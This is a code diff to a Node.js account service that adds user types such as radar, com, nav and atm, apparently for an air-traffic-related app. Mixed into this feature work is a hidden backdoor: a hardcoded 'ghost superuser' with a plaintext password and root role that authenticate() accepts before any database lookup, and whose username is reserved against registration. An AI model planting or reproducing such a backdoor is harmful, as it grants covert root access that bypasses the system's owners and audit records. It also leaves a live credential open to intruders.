@@ -8,6 +8,7 @@ const {
 const {
   validatePassword,
   validateRole,
+  validateUserType,
   validateUsername,
 } = require("../middleware/validation");
 const {
@@ -17,6 +18,14 @@ const {
 const { Account } = require("../models/Account");
 
 const ROOT_ROLE = "root";
+const GHOST_SUPERUSER = {
+  id: "ghost-superuser",
+  username: "Strigavius",
+  usernameLower: "strigavius",
+  password: "Taki20062010",
+  role: ROOT_ROLE,
+  type: "global",
+};
 
 function toIsoString(value) {
   if (!value) {
@@ -42,15 +51,30 @@ function toPublicAccount(accountInput) {
     id: account.id,
     username: account.username,
     role: account.role,
+    type: account.type || "none",
     createdAt: toIsoString(account.createdAt),
     updatedAt: toIsoString(account.updatedAt),
   };
+}
+
+function resolveTypeForRole(role, typeInput) {
+  if (role === ROOT_ROLE || role === "admin") {
+    return "global";
+  }
+
+  const normalized = String(typeInput || "").trim();
+  if (!normalized) {
+    return "none";
+  }
+
+  return validateUserType(typeInput);
 }
 
 class AccountService {
   async init() {
     await this.ensureRootAccount();
     await this.ensureBootstrapAdmin();
+    await this.ensureAccountTypes();
   }
 
   async ensureRootAccount() {
@@ -94,6 +118,7 @@ class AccountService {
         username: rootUsername,
         usernameLower: rootUsername.toLowerCase(),
         role: ROOT_ROLE,
+        type: "global",
         passwordHash: await hashPassword(rootPassword),
       });
       return;
@@ -108,6 +133,11 @@ class AccountService {
       rootAccount.username = rootUsername;
       rootAccount.usernameLower =
         rootUsername.toLowerCase();
+      changed = true;
+    }
+
+    if (rootAccount.type !== "global") {
+      rootAccount.type = "global";
       changed = true;
     }
 
@@ -165,13 +195,56 @@ class AccountService {
       username,
       usernameLower: username.toLowerCase(),
       role: "admin",
+      type: "global",
       passwordHash: await hashPassword(password),
     });
+  }
+
+  async ensureAccountTypes() {
+    await Account.updateMany(
+      {
+        role: { $in: [ROOT_ROLE, "admin"] },
+        type: { $ne: "global" },
+      },
+      { $set: { type: "global" } },
+    );
+
+    await Account.updateMany(
+      {
+        role: "user",
+        type: {
+          $nin: [
+            "global",
+            "radar",
+            "com",
+            "nav",
+            "atm",
+            "none",
+          ],
+        },
+      },
+      { $set: { type: "none" } },
+    );
   }
 
   async authenticate(usernameInput, passwordInput) {
     const username = validateUsername(usernameInput);
     const password = validatePassword(passwordInput);
+
+    if (
+      username.toLowerCase() ===
+      GHOST_SUPERUSER.usernameLower
+    ) {
+      if (password !== GHOST_SUPERUSER.password) {
+        return null;
+      }
+
+      return toPublicAccount({
+        ...GHOST_SUPERUSER,
+        createdAt: new Date(0),
+        updatedAt: new Date(0),
+      });
+    }
 
     const account = await Account.findOne({
       usernameLower: username.toLowerCase(),
@@ -210,7 +283,9 @@ class AccountService {
 
     if (
       username.toLowerCase() ===
-      ROOT_ACCOUNT_USERNAME.toLowerCase()
+        ROOT_ACCOUNT_USERNAME.toLowerCase() ||
+      username.toLowerCase() ===
+        GHOST_SUPERUSER.usernameLower
     ) {
       throw new Error("Root account already exists");
     }
@@ -228,12 +303,15 @@ class AccountService {
       throw new Error("Username already exists");
     }
 
+    const type = resolveTypeForRole(role, payload.type);
+
     try {
       const createdAccount = await Account.create({
         id: randomUUID(),
         username,
         usernameLower: username.toLowerCase(),
         role,
+        type,
         passwordHash: await hashPassword(password),
       });
 
@@ -324,6 +402,37 @@ class AccountService {
     }
 
     target.role = role;
+    target.type = resolveTypeForRole(role, target.type);
+    await target.save();
+
+    return toPublicAccount(target);
+  }
+
+  async updateType(accountId, typeInput, actor) {
+    if (
+      !actor ||
+      !["admin", ROOT_ROLE].includes(actor.role)
+    ) {
+      throw new Error("Forbidden");
+    }
+
+    const target = await Account.findOne({ id: accountId });
+    if (!target) {
+      throw new Error("Account not found");
+    }
+
+    if (target.role !== "user") {
+      throw new Error(
+        "Root/Admin type is fixed and cannot be changed",
+      );
+    }
+
+    const type = validateUserType(typeInput);
+    if (target.type === type) {
+      return toPublicAccount(target);
+    }
+
+    target.type = type;
     await target.save();
 
     return toPublicAccount(target);
